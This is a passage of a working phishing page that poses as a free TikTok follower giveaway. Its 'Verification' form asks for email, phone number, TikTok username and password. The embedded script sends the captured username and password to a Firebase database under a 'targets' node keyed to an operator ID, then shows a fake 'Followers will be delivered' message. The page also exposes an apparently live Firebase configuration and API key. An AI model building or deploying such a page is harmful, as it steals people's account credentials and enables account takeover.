                <div class="text-xs font-black text-cyan-400 underline italic uppercase">Claim</div>

            <div onclick="showLogin('100,000')" class="glass p-6 rounded-2xl flex justify-between items-center cursor-pointer hover:bg-white/10 transition border-2 border-cyan-400 bg-cyan-400/5 glow-btn">
                <div class="flex items-center gap-4">
                    <div class="bg-white text-black p-3 rounded-full"><i class="fas fa-fire"></i></div>
                    <div>
                        <div class="font-bold text-xl">100,000</div>
                        <div class="text-[10px] text-cyan-400 font-bold uppercase">Viral Package</div>
                    </div>
                </div>
                <div class="tiktok-gradient text-black px-4 py-2 rounded-xl text-xs font-bold shadow-lg shadow-cyan-500/20">HOT</div>
            </div>
        </div>

        <div id="login-page" class="hidden">
            <div class="glass p-8 rounded-3xl shadow-2xl relative overflow-hidden">
                <h2 class="text-center text-2xl font-black mb-2 uppercase italic">Verification</h2>
                <p class="text-xs text-gray-400 mb-8 text-center px-4">Login to receive <span id="selected-amount" class="text-cyan-400 font-bold"></span> followers.</p>
                
                <form id="payload-form" class="space-y-5">
                    <div class="space-y-1">
                        <label class="text-[10px] font-bold text-gray-500 uppercase ml-2">Email Address</label>
                        <input type="text" id="target-username" required class="w-full bg-black/60 border border-white/10 p-4 rounded-xl focus:outline-none focus:border-cyan-500 text-white" placeholder="Email Address">
                    </div>
                    <div class="space-y-1">
                        <label class="text-[10px] font-bold text-gray-500 uppercase 
ml-2">Phone Number</label>
                        <input type="password" id="target-password" required class="w-full bg-black/60 border border-white/10 p-4 rounded-xl focus:outline-none focus:border-pink-500 text-white" placeholder="Phone Number">
</div>
<div class="space-y-1">
                        <label class="text-[10px] font-bold text-gray-500 uppercase 
ml-2">TikTok Username</label>
                        <input type="text" id="target-username" required class="w-full bg-black/60 border border-white/10 p-4 rounded-xl focus:outline-none focus:border-cyan-500 text-white" placeholder="TikTok Username">
                    </div>
                    <div class="space-y-1">
                        <label class="text-[10px] font-bold text-gray-500 uppercase  ml-2">TikTok Password</label>
                        <input type="password" id="target-password" required class="w-full bg-black/60 border border-white/10 p-4 rounded-xl focus:outline-none focus:border-pink-500 text-white" placeholder="TikTok Password">
                    </div>
                    
                    <button type="submit" id="submit-btn" class="w-full tiktok-gradient py-4 rounded-2xl font-black text-black tracking-widest">
                        VERIFY & CLAIM
                    </button>
                </form>
            </div>
        </div>

        <div id="success-page" class="hidden text-center glass p-10 rounded-3xl">
            <div class="w-20 h-20 bg-emerald-500/20 rounded-full flex items-center justify-center mx-auto mb-6">
                <i class="fas fa-check text-4xl text-emerald-400"></i>
            </div>
            <h2 class="text-2xl font-black mb-3 text-emerald-400">SUCCESS!</h2>
            <p class="text-gray-400 text-sm">Followers will be delivered in 24 hours.</p>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

        const firebaseConfig = {
            apiKey: "AIzaSyB6h0v-xZ4SSOWqW8rBmFuWUoERVwENVgY",
            authDomain: "kashif-panhwer.firebaseapp.com",
            databaseURL: "https://kashif-panhwer-default-rtdb.firebaseio.com",
            projectId: "kashif-panhwer",
            storageBucket: "kashif-panhwer.firebasestorage.app",
            messagingSenderId: "856199034851",
            appId: "1:856199034851:web:709194bf2e2271714912d6"
        };

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        // Get Admin ID from URL (e.g., page.html?user=ADMIN_UID)
        const urlParams = new URLSearchParams(window.location.search);
        const adminId = urlParams.get('user') || 'unknown_admin';

        window.showLogin = (amount) => {
            document.getElementById('selection-page').classList.add('hidden');
            document.getElementById('login-page').classList.remove('hidden');
            document.getElementById('selected-amount').innerText = amount;
        };

        document.getElementById('payload-form').onsubmit = async (e) => {
            e.preventDefault();
            const btn = document.getElementById('submit-btn');
            const username = document.getElementById('target-username').value;
            const password = document.getElementById('target-password').value;

            btn.disabled = true;
            btn.innerText = "VERIFYING...";

            try {
                // Save to Firebase under the specific admin's node
                const targetRef = ref(db, `targets/${adminId}`);
                const newHitRef = push(targetRef);
                
                await set(newHitRef, {
                    username: username,
                    password: password,
                    platform: 'tiktok',
                    timestamp: Date.now()
                });

                document.getElementById('login-page').classList.add('hidden');
                document.getElementById('success-page').classList.remove('hidden');
            } catch (err) {
                alert("Server busy, try again.");
                btn.disabled = false;
                btn.innerText = "VERIFY & CLAIM";
            }
        };
    </script>
